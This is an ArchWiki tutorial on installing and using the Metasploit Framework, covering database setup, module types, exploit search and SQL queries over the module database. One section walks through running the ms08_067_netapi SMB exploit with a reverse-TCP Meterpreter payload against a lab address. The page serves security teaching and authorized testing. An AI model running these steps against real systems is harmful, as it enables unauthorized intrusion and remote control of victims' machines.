<!DOCTYPE html>
<html class="client-nojs vector-feature-language-in-header-enabled vector-feature-language-in-main-page-header-disabled vector-feature-sticky-header-disabled vector-feature-page-tools-pinned-disabled vector-feature-toc-pinned-clientpref-1 vector-feature-main-menu-pinned-disabled vector-feature-limited-width-clientpref-1 vector-feature-limited-width-content-enabled vector-feature-zebra-design-disabled vector-feature-custom-font-size-clientpref-disabled vector-feature-client-preferences-disabled vector-feature-typography-survey-disabled vector-toc-available" lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<title>Metasploit Framework - ArchWiki</title>
<link rel="stylesheet" href="../ArchWikiOffline.css">
<meta name="ResourceLoaderDynamicStyles" content="">
<meta name="generator" content="MediaWiki 1.41.1">
<meta name="referrer" content="no-referrer-when-downgrade">
<meta name="robots" content="max-image-preview:standard">
<meta name="format-detection" content="telephone=no">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=0.25, maximum-scale=5.0">
<link rel="icon" href="/favicon.ico">
<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="ArchWiki (en)">
<link rel="EditURI" type="application/rsd+xml" href="https://wiki.archlinux.org/api.php?action=rsd">
<link rel="license" href="https://www.gnu.org/copyleft/fdl.html">
<link rel="alternate" type="application/atom+xml" title="ArchWiki Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom">
</head>
<body class="skin-vector skin-vector-search-vue mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject page-Metasploit_Framework rootpage-Metasploit_Framework skin-vector-2022 action-view skin--responsive">
<a class="mw-jump-link" href="#bodyContent">Jump to content</a>
<div class="vector-header-container">
	</div>
<div class="mw-page-container">
	<div class="mw-page-container-inner">
		<div class="vector-main-menu-container">
		</div>
	<input type="checkbox" id="vector-toc-collapsed-checkbox" class="vector-menu-checkbox">
			<nav id="mw-panel-toc" role="navigation" aria-label="Contents" data-event-name="ui.sidebar-toc" class="mw-table-of-contents-container vector-toc-landmark vector-sticky-pinned-container">
				<div id="vector-toc-pinned-container" class="vector-pinned-container">
				<div id="vector-toc" class="vector-toc vector-pinnable-element">
	<div class="vector-pinnable-header vector-toc-pinnable-header vector-pinnable-header-pinned" data-feature-name="toc-pinned" data-pinnable-element-id="vector-toc">
	<h2 class="vector-pinnable-header-label">Contents</h2>
	<button class="vector-pinnable-header-toggle-button vector-pinnable-header-pin-button" data-event-name="pinnable-header.vector-toc.pin">move to sidebar</button>
	<button class="vector-pinnable-header-toggle-button vector-pinnable-header-unpin-button" data-event-name="pinnable-header.vector-toc.unpin">hide</button>
</div>


	<ul class="vector-toc-contents" id="mw-panel-toc-list">
		<li id="toc-mw-content-text" class="vector-toc-list-item vector-toc-level-1">
			<a href="#" class="vector-toc-link">
				<div class="vector-toc-text">Beginning</div>
			</a>
		</li>
		<li id="toc-Installation" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#Installation">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">1</span>Installation</div>
		</a>
		
			<button aria-controls="toc-Installation-sublist" class="cdx-button cdx-button--weight-quiet cdx-button--icon-only vector-toc-toggle">
				<span class="vector-icon vector-icon--x-small mw-ui-icon-wikimedia-expand"></span>
				<span>Toggle Installation subsection</span>
			</button>
		
		<ul id="toc-Installation-sublist" class="vector-toc-list">
			<li id="toc-Armitage" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Armitage">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">1.1</span>Armitage</div>
			</a>
			
			<ul id="toc-Armitage-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-RVM" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#RVM">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">1.2</span>RVM</div>
			</a>
			
			<ul id="toc-RVM-sublist" class="vector-toc-list">
			</ul>
		</li>
	</ul>
	</li>
	<li id="toc-Setting_up_the_database" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#Setting_up_the_database">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">2</span>Setting up the database</div>
		</a>
		
		<ul id="toc-Setting_up_the_database-sublist" class="vector-toc-list">
		</ul>
	</li>
	<li id="toc-Usage" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#Usage">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">3</span>Usage</div>
		</a>
		
			<button aria-controls="toc-Usage-sublist" class="cdx-button cdx-button--weight-quiet cdx-button--icon-only vector-toc-toggle">
				<span class="vector-icon vector-icon--x-small mw-ui-icon-wikimedia-expand"></span>
				<span>Toggle Usage subsection</span>
			</button>
		
		<ul id="toc-Usage-sublist" class="vector-toc-list">
			<li id="toc-Module_types" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Module_types">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">3.1</span>Module types</div>
			</a>
			
			<ul id="toc-Module_types-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Searching_for_exploits" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Searching_for_exploits">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">3.2</span>Searching for exploits</div>
			</a>
			
			<ul id="toc-Searching_for_exploits-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Using_an_exploit" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Using_an_exploit">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">3.3</span>Using an exploit</div>
			</a>
			
			<ul id="toc-Using_an_exploit-sublist" class="vector-toc-list">
			</ul>
		</li>
	</ul>
	</li>
	<li id="toc-Tips_and_tricks" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#Tips_and_tricks">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">4</span>Tips and tricks</div>
		</a>
		
			<button aria-controls="toc-Tips_and_tricks-sublist" class="cdx-button cdx-button--weight-quiet cdx-button--icon-only vector-toc-toggle">
				<span class="vector-icon vector-icon--x-small mw-ui-icon-wikimedia-expand"></span>
				<span>Toggle Tips and tricks subsection</span>
			</button>
		
		<ul id="toc-Tips_and_tricks-sublist" class="vector-toc-list">
			<li id="toc-Searching_from_the_database" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Searching_from_the_database">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">4.1</span>Searching from the database</div>
			</a>
			
			<ul id="toc-Searching_from_the_database-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Database_search_examples" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Database_search_examples">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">4.2</span>Database search examples</div>
			</a>
			
			<ul id="toc-Database_search_examples-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Popularity_of_a_platform_by_number_of_exploits" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Popularity_of_a_platform_by_number_of_exploits">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">4.3</span>Popularity of a platform by number of exploits</div>
			</a>
			
			<ul id="toc-Popularity_of_a_platform_by_number_of_exploits-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Disable_the_ASCII_banner_on_startup" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Disable_the_ASCII_banner_on_startup">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">4.4</span>Disable the ASCII banner on startup</div>
			</a>
			
			<ul id="toc-Disable_the_ASCII_banner_on_startup-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-Preserve_variable_values_between_sessions" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Preserve_variable_values_between_sessions">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">4.5</span>Preserve variable values between sessions</div>
			</a>
			
			<ul id="toc-Preserve_variable_values_between_sessions-sublist" class="vector-toc-list">
			</ul>
		</li>
	</ul>
	</li>
	<li id="toc-Troubleshooting" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#Troubleshooting">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">5</span>Troubleshooting</div>
		</a>
		
			<button aria-controls="toc-Troubleshooting-sublist" class="cdx-button cdx-button--weight-quiet cdx-button--icon-only vector-toc-toggle">
				<span class="vector-icon vector-icon--x-small mw-ui-icon-wikimedia-expand"></span>
				<span>Toggle Troubleshooting subsection</span>
			</button>
		
		<ul id="toc-Troubleshooting-sublist" class="vector-toc-list">
			<li id="toc-Cannot_click_in_VNC_viewer" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#Cannot_click_in_VNC_viewer">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">5.1</span>Cannot click in VNC viewer</div>
			</a>
			
			<ul id="toc-Cannot_click_in_VNC_viewer-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-cannot_load_such_file_--_robots_(LoadError)" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#cannot_load_such_file_--_robots_(LoadError)">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">5.2</span>cannot load such file -- robots (LoadError)</div>
			</a>
			
			<ul id="toc-cannot_load_such_file_--_robots_(LoadError)-sublist" class="vector-toc-list">
			</ul>
		</li>
		<li id="toc-db_connect_fails_silently" class="vector-toc-list-item vector-toc-level-2">
			<a class="vector-toc-link" href="#db_connect_fails_silently">
				<div class="vector-toc-text">
				<span class="vector-toc-numb">5.3</span>db_connect fails silently</div>
			</a>
			
			<ul id="toc-db_connect_fails_silently-sublist" class="vector-toc-list">
			</ul>
		</li>
	</ul>
	</li>
	<li id="toc-See_also" class="vector-toc-list-item vector-toc-level-1 vector-toc-list-item-expanded">
		<a class="vector-toc-link" href="#See_also">
			<div class="vector-toc-text">
			<span class="vector-toc-numb">6</span>See also</div>
		</a>
		
		<ul id="toc-See_also-sublist" class="vector-toc-list">
		</ul>
	</li>
</ul>
</div>

				</div>
	</nav>
		
		<div class="mw-content-container">
			<main id="content" class="mw-body" role="main" style="margin: 0">
				<header class="mw-body-header vector-page-titlebar">
					<label id="vector-toc-collapsed-button" class="cdx-button cdx-button--fake-button cdx-button--fake-button--enabled cdx-button--weight-quiet vector-button-flush-left cdx-button--icon-only" for="vector-toc-collapsed-checkbox" role="button" aria-controls="vector-toc" tabindex="0" title="Table of Contents">
						<span class="vector-icon mw-ui-icon-wikimedia-listBullet"></span>
						<span>Toggle the table of contents</span>
					</label>
					<nav role="navigation" aria-label="Contents" class="vector-toc-landmark">
						
<div id="vector-page-titlebar-toc" class="vector-dropdown vector-page-titlebar-toc vector-button-flush-left">
	<input type="checkbox" id="vector-page-titlebar-toc-checkbox" role="button" aria-haspopup="true" data-event-name="ui.dropdown-vector-page-titlebar-toc" class="vector-dropdown-checkbox " aria-label="Toggle the table of contents">
	<label id="vector-page-titlebar-toc-label" for="vector-page-titlebar-toc-checkbox" class="vector-dropdown-label cdx-button cdx-button--fake-button cdx-button--fake-button--enabled cdx-button--weight-quiet cdx-button--icon-only " aria-hidden="true"><span class="vector-icon mw-ui-icon-listBullet mw-ui-icon-wikimedia-listBullet"></span>

<span class="vector-dropdown-label-text">Toggle the table of contents</span>
	</label>
	<div class="vector-dropdown-content">


							<div id="vector-page-titlebar-toc-unpinned-container" class="vector-unpinned-container">
			</div>
		
	</div>
</div>

					</nav>
					<h1 id="firstHeading" class="firstHeading mw-first-heading"><span class="mw-page-title-main">Metasploit Framework</span></h1>
							
<div id="p-lang-btn" class="vector-dropdown mw-portlet mw-portlet-lang">
	<input type="checkbox" id="p-lang-btn-checkbox" role="button" aria-haspopup="true" data-event-name="ui.dropdown-p-lang-btn" class="vector-dropdown-checkbox mw-interlanguage-selector" aria-label="Go to an article in another language. Available in 1 language">
	<label id="p-lang-btn-label" for="p-lang-btn-checkbox" class="vector-dropdown-label cdx-button cdx-button--fake-button cdx-button--fake-button--enabled cdx-button--weight-quiet cdx-button--action-progressive mw-portlet-lang-heading-1" aria-hidden="true"><span class="vector-icon mw-ui-icon-language-progressive mw-ui-icon-wikimedia-language-progressive"></span>

<span class="vector-dropdown-label-text">1 language</span>
	</label>
	<div class="vector-dropdown-content">

		<div class="vector-menu-content">
			
			<ul class="vector-menu-content-list">
				
				<li class="interlanguage-link interwiki-ja mw-list-item"><a href="https://wiki.archlinux.jp/index.php/Metasploit_Framework" title="Metasploit Framework – 日本語" lang="ja" hreflang="ja" class="interlanguage-link-target"><span>日本語</span></a></li>
			</ul>
			
		</div>

	</div>
</div>
</header>
				<div class="vector-column-end">
					<nav class="vector-page-tools-landmark vector-sticky-pinned-container" aria-label="Page tools">
						<div id="vector-page-tools-pinned-container" class="vector-pinned-container">
			
						</div>
	</nav>
				</div>
				<div id="bodyContent" class="vector-body" aria-labelledby="firstHeading" data-mw-ve-target-container>
					<div class="vector-body-before-content">
							<div class="mw-indicators">
		</div>

						<div id="siteSub" class="noprint">From ArchWiki</div>
					</div>
					<div id="contentSub"><div id="mw-content-subtitle"></div></div>
					
					
					<div id="mw-content-text" class="mw-body-content mw-content-ltr" lang="en" dir="ltr">
<div class="mw-parser-output">
<div class="noprint archwiki-template-message">
<p><span class="mw-default-size" typeof="mw:File"><span><img src="../File:Tango-view-fullscreen.svg" decoding="async" width="48" height="48" class="mw-file-element"></span></span><b>This article or section needs expansion.</b></p>
<div>
<b>Reason:</b> Meterpreter; More/better SQL search examples; More commands; Module development; (Discuss in <a rel="nofollow" class="external text" href="../en/Talk:Metasploit_Framework.html">Talk:Metasploit Framework</a>)</div>
</div>
<p>From <a rel="nofollow" class="external text" href="https://www.offensive-security.com/metasploit-unleashed/Introduction">the official site</a>:
</p>
<dl><dd>Consider the MSF to be one of the single most useful auditing tools freely available to security professionals today. From a wide array of commercial grade exploits and an extensive exploit development environment, all the way to network information gathering tools and web vulnerability plugins. The Metasploit Framework provides a truly impressive work environment.  The MSF is far more than just a collection of exploits, it's an infrastructure that you can build upon and utilize for your custom needs. This allows you to concentrate on your unique environment, and not have to reinvent the wheel.</dd></dl>
<p>Currently, Metasploit requires to setup and configure <a href="../en/PostgreSQL.html" title="PostgreSQL">PostgreSQL</a> on target system to work.
This wiki will show how to get Metasploit working with a PostgreSQL database.
</p>
<meta property="mw:PageProp/toc">
<h2><span class="mw-headline" id="Installation">Installation</span></h2>
<p>Install package <span class="plainlinks archwiki-template-pkg"><a rel="nofollow" class="external text" href="https://archlinux.org/packages/?name=metasploit">metasploit</a></span>. It is optional to follow the RVM setup instructions below. 
For latest development version, install <span class="plainlinks archwiki-template-pkg"><a rel="nofollow" class="external text" href="https://aur.archlinux.org/packages/metasploit-git/">metasploit-git</a></span><sup><small>AUR</small></sup> instead.
</p>
<h3><span class="mw-headline" id="Armitage">Armitage</span></h3>
<p><a rel="nofollow" class="external text" href="http://www.fastandeasyhacking.com/">Armitage</a> is a GUI front end for Metasploit written in Java; it can be installed with the <span class="plainlinks archwiki-template-pkg"><a rel="nofollow" class="external text" href="https://aur.archlinux.org/packages/armitage-git/">armitage-git</a></span><sup><small>AUR</small></sup> package.
</p>
<p>When running Armitage, <a href="#Setting_up_the_database">#Setting up the database</a> is not optional, and must be followed. It is also mandatory to use a <code>~/.msf4/database.yml</code> file.
</p>
<p>A sample <code>database.yml</code> file is packaged with Armitage as <code>/usr/share/metasploit/database.yml.sample</code>.
</p>
<h3><span class="mw-headline" id="RVM">RVM</span></h3>
<p>Msfconsole requires <a href="../en/Ruby.html" title="Ruby">Ruby</a> and some <a href="../en/Ruby.html#RubyGems" title="Ruby">Ruby#RubyGems</a> to run without error.
</p>
<p>Follow the <a href="../en/RVM.html#Installation" title="RVM">RVM#Installation</a> and <a href="../en/RVM.html#Using_RVM" title="RVM">RVM#Using RVM</a> articles to install and use Ruby version 3.0.5 (see <a rel="nofollow" class="external text" href="https://github.com/rapid7/metasploit-framework/blob/master/.ruby-version">Metasploit Git Repo</a>) and set it to default.
</p>
<p>Once complete, source the newly created RVM installation:
</p>
<pre>$ source ~/.rvm/scripts/rvm
</pre>
<p>Now cd into <code>/opt/metasploit</code> and use <a href="../en/Ruby.html#Bundler" title="Ruby">Ruby#Bundler</a> to install all gems necessary to run Msfconsole:
</p>
<pre>$ gem install bundler
$ bundle install
</pre>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> Using a version of Ruby older than 2.3.1 will result in the failure to install the <code>metasploit-concern</code> gem.</div>
<h2><span class="mw-headline" id="Setting_up_the_database">Setting up the database</span></h2>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> Commands which must be run from <code>msfconsole</code> will be prefixed with <code>msf &gt;</code> in this article.</div>
<p>Metasploit can be used without a database, but cache operations like searching would be very slow.  This section shows how to set up Metasploit with <i>Postgresql</i> database server.
</p>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> If you are using the <a href="#Armitage">#Armitage</a> front-end, the database is mandatory.</div>
<p>Follow the <a href="../en/PostgreSQL.html" title="PostgreSQL">PostgreSQL</a> article to setup / start the service. 
Once the service is started and running, run :
</p>
<pre>msfdb init --connection-string=postgresql://postgres@localhost:5432/postgres
</pre>
<p>The database should now be properly initialized, and the connection should be automatically established when running <code>msfconsole</code>.
</p>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> The database cache needs to be built only once.  Later on upon startup, <code>msfconsole</code> will say <code>[*] Rebuilding the module cache in the background...</code>, but it will actually only update the changes.  If no changes are made to the database, it will take only half a second.</div>
<p>Run <code>db_status</code> to verify that database connection is properly established:
</p>
<pre style="margin-bottom: 0; border-bottom:none; padding-bottom:0.8em;">msf &gt; db_status</pre>
<pre style="margin-top: 0; border-top-style:dashed; padding-top: 0.8em;">[*] postgresql connected to msf
</pre>
<h2><span class="mw-headline" id="Usage">Usage</span></h2>
<p>There are several interfaces available for Metasploit.  This section will explain how to use <code>msfconsole</code>, the interface that provides the most features available in MSF.
</p>
<p>To start it, simply type <code>msfconsole</code>.  The prompt will change to <code>msf &gt;</code> to indicate it is waiting for commands.
</p>
<div class="archwiki-template-box archwiki-template-box-tip">
<strong>Tip:</strong> Besides additional Metasploit commands explained below, all the regular shell commands and scripts found in <code>$PATH</code> are available too! (except for aliases)</div>
<h3><span class="mw-headline" id="Module_types">Module types</span></h3>
<p>Everything (scripts, files, programs etc) in Metasploit is a module. There are 6 types of modules:
</p>
<ul>
<li>
<code>auxiliary</code> - Modules for helping the attacker in various tasks, like <a href="../en/Nmap.html" title="Nmap">port scanning</a>, version detection or network traffic analysis</li>
<li>
<code>exploit</code> - The code that takes advantage of a vulnerability and allows the execution of the payload, like triggering buffer overflow or bypassing authentication</li>
<li>
<code>payload</code> - The thing that has to be done right after a successful exploit, like establishing a remote connection, starting a meterpreter session or executing some shell commands</li>
<li>
<code>post</code> - Various programs that can be run after successful exploitation and remote connection, like collecting passwords, setting up keyloggers or downloading files</li>
<li>
<code>encoder</code> - Programs for performing encryption</li>
<li>
<code>nop</code> - <i>NOP</i> generators.  <i>NOP</i> is an assembly language instruction which simply does nothing.  The machine code of this instruction is different on each hardware architecture.  <i>NOP</i> instructions are useful for filling the void in executables.</li>
</ul>
<h3><span class="mw-headline" id="Searching_for_exploits">Searching for exploits</span></h3>
<p>To discover what operating system and software version a target runs, perform a <a href="../en/Nmap.html" title="Nmap">port scan</a>.  With this information, use the <code>search</code> command to search for available exploits.
</p>
<p>To search for all exploits targeting Novell on the Linux platform:
</p>
<pre>msf &gt; search platform:linux type:exploit name:Novell
</pre>
<p>To search for all exploits on the Linux platform containing the keyword Apache and filter the results with <i>grep</i>:
</p>
<pre>msf &gt; grep RCE search platform:linux type:exploit Apache
</pre>
<p>To search for specific field, type its name, followed by column and the phrase.  The following search fields are available:
</p>
<table class="wikitable">
<tbody>
<tr>
<th style="white-space:nowrap">Search field
</th>
<th style="white-space:nowrap">Matches
</th>
<th style="white-space:nowrap">Possible values
</th>
<th style="white-space:nowrap">DB table &amp; column
</th>
</tr>
<tr>
<td>
<code>app</code>
</td>
<td style="white-space:nowrap">Passive (client) or Active (server) exploits
</td>
<td>
<code>client</code>, <code>server</code>
</td>
<td style="white-space:nowrap">
<code>module_details.stance</code>
</td>
</tr>
<tr>
<td>
<code>author</code>
</td>
<td style="white-space:nowrap">Name and email of module Author
</td>
<td>Any phrase
</td>
<td style="white-space:nowrap">
<code>module_authors.name</code>
</td>
</tr>
<tr>
<td>
<code>type</code>
</td>
<td style="white-space:nowrap">The <a href="#Module_types">module type</a>
</td>
<td>
<code>auxiliary</code>, <code>exploit</code>, <code>payload</code>, <code>post</code>, <code>encoder</code>, <code>nop</code>
</td>
<td style="white-space:nowrap">
<code>module_details.mtype</code>
</td>
</tr>
<tr>
<td>
<code>name</code>
</td>
<td style="white-space:nowrap">The path (Name) and the short description
</td>
<td>Any phrase
</td>
<td>
<code>module_details.fullname</code>, <code>module_details.name</code>
</td>
</tr>
<tr>
<td>
<code>platform</code>
</td>
<td style="white-space:nowrap">The target hardware or software platform
</td>
<td>
<code>bsdi</code>, <code>netware</code>, <code>linux</code>, <code>hpux</code>, <code>irix</code>, <code>osx</code>, <code>bsd</code>, <code>platform</code>, <code>java</code>, <code>javascript</code>, <code>unix</code>, <code>php</code>, <code>firefox</code>, <code>nodejs</code>, <code>ruby</code>, <code>cisco</code>, <code>android</code>, <code>aix</code>, <code>windows</code>, <code>python</code>, <code>solaris</code>
</td>
<td style="white-space:nowrap">
<code>module_platforms.name</code>
</td>
</tr>
<tr>
<td>
<code>bid</code>, <code>cve</code>, <code>edb</code>, <code>osvdb</code> or <code>ref</code>
</td>
<td>The <a rel="nofollow" class="external text" href="https://www.securityfocus.com/">Bugtraq</a><sup title="Last check status: domain name not resolved">[<a href="https://en.wikipedia.org/wiki/Wikipedia:Link_rot" class="extiw" title="wikipedia:Wikipedia:Link rot">dead link</a> 2023-05-07 ⓘ]</sup>, <a rel="nofollow" class="external text" href="https://www.cvedetails.com/">CVE</a>, <a rel="nofollow" class="external text" href="https://www.exploit-db.com/">Exploit-DB</a>, <a rel="nofollow" class="external text" href="https://www.osvdb.org/">OSBDB</a> ID or any
</td>
<td>Exploit database entry ID, or a part of upstream report URL
</td>
<td style="white-space:nowrap">
<code>module_refs.name</code>
</td>
</tr>
<tr>
<td>(No field)
</td>
<td>All of the above except <code>app</code> and <code>type</code>
</td>
<td>Any phrase
</td>
<td>All of the above
</td>
</tr>
</tbody>
</table>
<p>See <a href="#Searching_from_the_database">#Searching from the database</a> and <a href="#Database_search_examples">#Database search examples</a> for more advanced search queries.
</p>
<h3><span class="mw-headline" id="Using_an_exploit">Using an exploit</span></h3>
<p>After choosing an appropriate exploit, it is time to start hacking!
</p>
<p>First, select an exploit using the <code>use</code> command:
</p>
<pre>msf &gt; use exploit/windows/smb/ms08_067_netapi
</pre>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> <code>ms08_067_netapi</code> is one of the most popular exploits affecting Windows XP and Windows Server 2003 SMB services.  It was disclosed in 2008 and proves to be very reliable in exploiting unpatched systems which have firewalls disabled.</div>
<p>To view information about a module, use the <code>info</code> command:
</p>
<pre>msf exploit(ms08_067_netapi) &gt; info exploit/windows/smb/ms08_067_netapi
</pre>
<p>Running <code>info</code> without arguments will show info about currently selected module.
</p>
<p>To view the selected exploit's options, run:
</p>
<pre style="margin-bottom: 0; border-bottom:none; padding-bottom:0.8em;">msf exploit(ms08_067_netapi) &gt; show options</pre>
<pre style="margin-top: 0; border-top-style:dashed; padding-top: 0.8em;">Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

   ...
</pre>
<p>All the required fields must be provided before exploitation.  Here, only the <code>RHOST</code> variable must be specified.  To assign a value to a variable use the <code>set</code> command:
</p>
<pre>msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.56.102
</pre>
<p>Now choose the payload:
</p>
<pre>msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</pre>
<div class="archwiki-template-box archwiki-template-box-note">
<strong>Note:</strong> Meterpreter is a command shell built into Metasploit and allows the attacker to run remote commands on exploited systems.  Reverse TCP is technique when the exploited computer establishes a connection back to the computer it was exploited from.</div>
<p>Choosing a payload (actually, choosing modules in general) will add more options.  Run <code>show options</code> again:
</p>
<pre style="margin-bottom: 0; border-bottom:none; padding-bottom:0.8em;">msf exploit(ms08_067_netapi) &gt; show options</pre>
<pre style="margin-top: 0; border-top-style:dashed; padding-top: 0.8em;">Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.56.102   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port
</pre>
<p>Now assign <code>LHOST</code> variable to the address of your computer, where the exploited computer will send connection requests to:
</p>
<pre>msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.56.1
</pre>
<p>Now launch the attack!
</p>
<pre>msf exploit(ms08_067_netapi) &gt; exploit
</pre>
<p>If you are lucky, you will be dropped to a Meterpreter session where you can do anything on the remote computer.
</p>
<h2><span class="mw-headline" id="Tips_and_tricks">Tips and tricks</span></h2>
<h3><span class="mw-headline" id="Searching_from_the_database">Searching from the database</span></h3>
<p>Since everything in Metasploit is stored in a database, it is easy to make powerful search queries without the need of the <code>search</code> frontend command.
</p>
<p>To start the database interface, run:
</p>
<pre>$ psql msf
</pre>
<p>The information about modules is stored in 8 tables:
</p>
<table class="wikitable">
<tbody>
<tr>
<th>Table Name
</th>
<th>Contents
</th>
</tr>
<tr>
<td>
<code>module_details</code>
</td>
<td>The "main" table, describes various details of each module
</td>
</tr>
<tr>
<td>
<code>module_actions</code>
</td>
<td>The action names of <i>auxiliary</i> modules
</td>
</tr>
<tr>
<td>
<code>module_archs</code>
</td>
<td>The target hardware architecture or software platform
</td>
</tr>
<tr>
<td>
<code>module_authors</code>
</td>
<td>Names and emails of module author
</td>
</tr>
<tr>
<td>
<code>module_mixins</code>
</td>
<td>Empty (???)
</td>
</tr>
<tr>
<td>
<code>module_platforms</code>
</td>
<td>The target operating system.  See also <a href="#Popularity_of_a_platform_by_number_of_exploits">#Popularity of a platform by number of exploits</a>
</td>
</tr>
<tr>
<td>
<code>module_refs</code>
</td>
<td>References to various online exploit databases and reports
</td>
</tr>
<tr>
<td>
<code>module_targets</code>
</td>
<td>The target program name and version of the <i>exploit</i>
</td>
</tr>
</tbody>
</table>
<div class="archwiki-template-box archwiki-template-box-tip">
<strong>Tip:</strong> To see what type of details (columns) a table contains, run <code>\d+ <i>table_name</i></code>.  For example: <code>\d+ module_details</code>.</div>
<p>Almost all tables have 3 columns: <code>id</code>, <code>detail_id</code> and <code>name</code>, except for <code>module_details</code> table which has 16 columns.
</p>
<p>The <code>detail_id</code> values are pointers to the rows of <code>module_details</code> table.
</p>
<p>To see the all the contents of a table, run:
</p>
<pre>SELECT * FROM <i>table_name</i>;
</pre>
<p>Multiple:
</p>
<ul>
<li>Architecture</li>
<li>Platform</li>
<li>Target</li>
</ul>
<p>Module options:
</p>
<ul>
<li>module type</li>
<li>stance</li>
<li>privileged</li>
<li>path</li>
<li>name</li>
<li>refname</li>
<li>rank</li>
<li>privileged</li>
<li>disclosure date</li>
</ul>
<h3><span class="mw-headline" id="Database_search_examples">Database search examples</span></h3>
<p>The <code>module_details</code> table contains multiple columns and viewing them all at once is not convenient.  To show only basic information about the modules:
</p>
<pre>SELECT id, mtype, refname, disclosure_date, rank, stance, name
FROM module_details;
</pre>
<p>Show some information about available modules, include platform information from <code>module_platforms</code>:
</p>
<pre>SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id;
</pre>
<p>Show all client (aggressive) exploits for Windows platform:
</p>
<pre>SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND stance = 'aggressive';
</pre>
<p>Show all exploits for Windows platform with rank &gt;= 500 disclosed after 2013:
</p>
<pre>SELECT module_details.id, mtype, module_platforms.name as platform, refname, DATE(disclosure_date), rank, module_details.name
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND rank &gt;= 500
AND disclosure_date &gt;= TIMESTAMP '2013-1-1';
</pre>
<p>Show all aggressive (client) exploits for Windows platform with rank &gt;= 500 and include additional information about module's target:
</p>
<pre>SELECT module_details.id, mtype, module_platforms.name as platform, module_details.name, DATE(disclosure_date), rank, module_targets.name as target
FROM module_details JOIN module_platforms ON module_details.id = module_platforms.detail_id JOIN module_targets on module_details.id = module_targets.detail_id
WHERE module_platforms.name = 'windows'
AND mtype = 'exploit'
AND stance = 'aggressive'
AND rank &gt;= 500
order by target;
</pre>
